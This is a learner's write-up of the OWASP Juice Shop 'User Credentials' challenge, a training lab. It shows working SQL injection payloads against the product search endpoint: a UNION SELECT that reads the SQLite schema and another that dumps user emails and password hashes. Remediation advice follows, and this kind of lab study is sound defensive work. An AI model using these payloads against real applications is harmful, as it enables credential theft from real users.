# Challenge: User Credentials

## Category

Injection / SQL Injection

## Platform

OWASP Juice Shop

## Objective

Retrieve a list of all user credentials via SQL Injection.

## What I observed

The application exposes a product search API endpoint:

```http
GET /rest/products/search?q=
```

The response returns product data in JSON format, including fields such as:

```text
id
name
description
price
deluxePrice
image
createdAt
updatedAt
deletedAt
```

From previous SQL injection testing on this endpoint, I understood that the backend query returns 9 columns. This means that any `UNION SELECT` payload must also return 9 columns.

I also noticed that the application uses SQLite, so the database schema can be inspected through the `sqlite_master` table.

## My hypothesis

The product search endpoint is SQL injectable, and because the query result is returned in the HTTP response, I can use a `UNION SELECT` attack to retrieve data from other database tables.

The goal is not only to search products, but to reuse the vulnerable product search endpoint to display data from the `Users` table.

## Testing steps

### 1. Extract database schema

I used a SQL injection payload against the product search endpoint to retrieve schema definitions from SQLite:

```http
GET /rest/products/search?q=')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--
```

This returned schema definitions from the database.

### 2. Identify the users table

In the response, I found the schema definition for the `Users` table:

```sql
CREATE TABLE `Users` (
  `id` INTEGER PRIMARY KEY AUTOINCREMENT,
  `username` VARCHAR(255) DEFAULT '',
  `email` VARCHAR(255) UNIQUE,
  `password` VARCHAR(255),
  `role` VARCHAR(255) DEFAULT 'customer',
  `deluxeToken` VARCHAR(255) DEFAULT '',
  `lastLoginIp` VARCHAR(255) DEFAULT '0.0.0.0',
  `profileImage` VARCHAR(255) DEFAULT '/assets/public/images/uploads/default.svg',
  `totpSecret` VARCHAR(255) DEFAULT '',
  `isActive` TINYINT(1) DEFAULT 1,
  `createdAt` DATETIME NOT NULL,
  `updatedAt` DATETIME NOT NULL,
  `deletedAt` DATETIME
)
```

This confirmed that user credentials are stored in the `Users` table.

Important columns:

```text
id
email
password
username
role
```

### 3. Attempted wrong direction

I initially tried to use another endpoint:

```http
GET /rest/user/whoami?fields=...
```

This returned only limited information about the current user and did not expose the full table data.

This was a useful mistake because it showed that I did not need a new endpoint. I needed to keep using the already vulnerable endpoint:

```http
GET /rest/products/search?q=
```

### 4. Retrieve credentials from the Users table

Since the product search query returns 9 columns, I crafted a `UNION SELECT` payload with 9 values and placed user data into visible product fields:

```http
GET /rest/products/search?q=')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--
```

This made the application return user credential data inside the product search response.

## Result

The challenge was solved after retrieving user credential data from the `Users` table using SQL injection.

The injected query joined data from the `Users` table into the original product search response.

## Why it worked

The product search endpoint inserted user-controlled input into a SQL query without proper parameterization.

The vulnerable query normally returned product data, but the `UNION SELECT` payload allowed data from another table to be appended to the result.

Because the response displayed the query results, the attacker could exfiltrate sensitive data from the database.

## Root cause

The root cause is unsafe SQL query construction.

The application allowed user input from the search parameter to alter the structure of the backend SQL query.

Main issues:

* User input was not safely parameterized.
* SQL injection was possible in the product search endpoint.
* Database schema information was accessible through injection.
* Sensitive user data could be retrieved through the same vulnerable endpoint.
* The database user had enough privileges to read sensitive tables.

## Impact in a real application

In a real application, this vulnerability could allow an attacker to:

* Enumerate database tables and columns.
* Retrieve user emails and password hashes.
* Access sensitive user account information.
* Attempt password cracking if password hashes are weak.
* Escalate to account takeover if administrator credentials are exposed.
* Use leaked data for phishing, credential stuffing, or further attacks.

## Remediation

Recommended fixes:

* Use parameterized queries or prepared statements.
* Avoid building SQL queries by concatenating user input.
* Validate and sanitize user-controlled input.
* Apply least privilege to the database user used by the application.
* Do not expose detailed SQL errors to users.
* Store passwords using strong password hashing algorithms such as bcrypt, Argon2, or scrypt.
* Monitor and alert on suspicious database access patterns.
* Add security tests for SQL injection in search, login, filter, and API endpoints.

## What I learned

This challenge taught me that once I find a vulnerable SQL injection endpoint, I can reuse it to retrieve data from other tables.

I also learned that I do not always need to find a new endpoint for each table. The important part is to find one endpoint where my input enters a SQL query and where the response displays query results.

## Mistake I made

I tried to exploit another endpoint:

```http
/rest/user/whoami?fields=...
```

But this endpoint only returned limited current-user data.

The better approach was to continue using the vulnerable product search endpoint and use `UNION SELECT` to retrieve data from the `Users` table.

## Memory rule

If one endpoint is SQL injectable and returns database results, keep using that endpoint to extract other tables with `UNION SELECT`.

For SQLite schema extraction:

```text
sqlite_master contains the database schema.
```

For Juice Shop product search SQLi:

```text
The original product query returns 9 columns, so my UNION SELECT must also return 9 columns.
```
